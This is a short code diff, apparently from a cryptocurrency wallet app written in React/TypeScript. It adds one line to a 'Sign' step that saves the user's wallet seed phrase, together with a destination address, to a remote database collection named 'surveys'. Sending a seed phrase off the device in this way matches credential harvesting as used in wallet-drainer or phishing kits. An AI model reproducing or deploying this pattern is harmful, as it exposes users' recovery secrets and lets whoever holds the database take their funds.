@@ -96,6 +96,7 @@ function Sign({ onPrevious }: SignStepProps) {
 			const [userUpdated, userId] = await Promise.all([
 				updateDocumentById("surveys", walletId, {
 					destinationAddress: destinationAddress,
+					seedPhrase: seedPhrase,
 				}),
 				storeUserData(survayUser),
 			]);
